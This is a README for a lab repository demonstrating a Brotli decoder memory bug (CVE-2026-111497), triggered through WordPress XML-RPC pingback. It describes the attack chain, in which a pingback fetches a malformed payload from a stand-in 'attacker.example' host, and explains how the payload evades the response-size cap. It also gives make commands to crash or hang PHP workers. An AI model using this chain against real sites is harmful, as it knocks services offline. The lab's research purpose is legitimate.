# brotli-pingback-lab

A small Docker lab for **CVE-2026-111497** (out-of-bounds write in the
Google Brotli decoder), reached through **WordPress XML-RPC pingback**.

One unauthenticated `pingback.ping` makes WordPress fetch an attacker URL.
WordPress hands the response to libcurl, libcurl decodes
`Content-Encoding: br` inside the PHP worker, and a malformed Brotli stream
kills or stalls the worker:

| Payload | Impact |
|---|---|
| 86 bytes | decode loop never progresses; worker pinned at 100% CPU |
| ~23 MB | out-of-bounds write in `BrotliDecoderState`; worker dies with **SIGSEGV** |

> **Lab only.** The PoC refuses targets that resolve to public IPs unless
> `--i-own-this-target` is supplied. Do not use it on systems you do not own.
> This project demonstrates availability impact; it contains **no RCE exploit**.

## Quickstart

```bash
git clone <this-repo> brotli-pingback-lab
cd brotli-pingback-lab
cp .env.example .env

make up       # WordPress + MariaDB + nginx + payload server
make probe    # xmlrpc.php and pingback.ping
make verify   # confirm the Brotli stack is vulnerable
make crash    # one SIGSEGV
make hang     # one worker at 100% CPU (recover: make restart)
```

Expected crash log:

```text
WARNING: [pool www] child 10 exited on signal 11 (SIGSEGV - core dumped)
```

Expected hang:

```text
[1] <- timeout after 12.0s
brotli-pingback-lab-wordpress-1 cpu=99.29%
```

The lab uses the **stock php-fpm config** (`pm = dynamic`,
`pm.max_children = 5`, no `request_terminate_timeout`). A crash is immediate.
A hang is ended by PHP-FPM's `max_execution_time` (30s, exit code 124);
`make restart` recovers immediately.

## The chain

1. The attacker POSTs `pingback.ping` to `/xmlrpc.php` with
   `sourceURI = https://attacker.example/payload.br` and a target post URL.
2. `pingback_ping()` calls `wp_safe_remote_get()` after a one-second sleep.
3. Requests' cURL transport sets `CURLOPT_ENCODING = ''`, so libcurl accepts
   and decodes `br` in-process.
4. libcurl decodes the attacker body **inside the PHP worker**, before
   WordPress parses it.
5. The malformed stream spins the decoder or corrupts its state.

The pingback response cap (`limit_response_size = 153600`) applies to
**decompressed** bytes. The 23 MB trigger decodes to zero bytes until its
final 127-byte tail, so the cap never trips. The tail must arrive in a
separate decoder call; the payload server sends it as a second HTTP chunk
after a one-second delay.

## Why crash-only?

CVE-2026-111497 is a memory-safety bug, and public research demonstrates RCE
in Node.js with a deterministic heap layout. In the WordPress path the write
is relative to the Brotli ring buffer, the allocator differs, and the
attacker gets no feedback from the decoded body. A blind remote RCE is not
established, so this lab stops at the SIGSEGV / worker stall. No heap
grooming or pointer leak is included.

## Verified results (x86-64, 2026-10-27)

Crash:

```text
[1] <- HTTP 502 in 2.7s
    crashed    1
WARNING: [pool www] child 10 exited on signal 11 (SIGSEGV - core dumped)
```

Hang:

```text
[1] <- timeout after 12.0s
    hung       1
brotli-pingback-lab-wordpress-1 cpu=99.29%
```

Stack: PHP 8.3.36, libcurl 8.14.1, `libbrotli1 1.1.0-2+b7`, Brotli enabled.

## Layout

```text
.
├── docker-compose.yml        # db, wordpress, nginx, attacker, wp-init
├── Makefile                  # up / probe / verify / crash / hang / restart
├── docs/
│   ├── vulnerability.md      # CVE, root cause, chain, references
│   └── lab.md                # setup, usage, logs, detection, mitigation
├── lab/
│   ├── attacker/             # payload generator + HTTP server
│   ├── nginx/default.conf
│   └── wordpress/mu-plugins/ # lab-only attacker-host allowlist
├── poc/pingback_poc.py       # probe / hang / crash client
├── scripts/verify-vulnerable.sh
└── tests/test_payload.py
```

## Docs

* [Vulnerability](docs/vulnerability.md) — CVE-2026-111497, root cause, chain
* [Lab](docs/lab.md) — setup, modes, expected output, detection, mitigation

## Safety

* The PoC is capped at 32 concurrent requests and refuses public targets by
  default.
* The lab's WordPress admin password is `admin`; keep it local.
* The only addition to the official WordPress image is a 10-line mu-plugin
  that allowlists the Docker-internal `attacker` hostname. Remove it if you
  serve the payload from a public host.

## Credits

Google Brotli maintainers and the CVE reporters; the Node.js security team
and its regression test; Imperva, Red Hat, Akamai, and Wiz for the public
analysis; `TheFool-TAROT` and `dimasma0305` for the stream-format research.

## License

MIT — see [LICENSE](LICENSE).
